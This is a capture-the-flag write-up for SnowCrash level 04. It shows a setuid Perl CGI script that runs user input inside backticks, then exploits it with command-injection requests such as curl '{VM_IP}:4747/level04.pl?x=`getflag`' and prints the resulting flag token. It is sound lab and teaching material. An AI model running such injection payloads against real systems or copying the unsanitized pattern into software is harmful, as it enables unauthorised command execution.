# Level 04

## Vulnerability
Privilege escalation - CGI code injection

## Context
In our home directory, we find a binary ```level04.pl```

## Solution
```
level04@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```
Here we see that when we run this Perl script, we run it with owner flag04 permissions (setuid bit 's'). We don't have the permissions to run getflag directly, but maybe we can get this Perl script to run getflag for us.

Let's investigate the script.
```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747                        ## port hint
use CGI qw{param};                      ## set up a Common Gateway Interface
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;                 ## print the output of the echo command, command substitution (backticks)
}
x(param("x"));                          ## Accept one argument "x"
```
So we should run this script with one argument "x". Lets try an example.
```
level04@SnowCrash:~$ ./level04.pl x="whoami"
whoami
```
If we use backtick notation, we can pass a command and ensure it's run and its output captured and echoed.
```
level04@SnowCrash:~$ ./level04.pl x=`whoami`
level04
```
Lets try running it on port 4747 as suggested.
```
level04@SnowCrash:~$ curl '{VM_IP}:4747/level04.pl?x=`whoami`'
flag04
```
Great, now we are executing as flag04. lets try executing getflag.
```
level04@SnowCrash:~$ curl '{VM_IP}:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
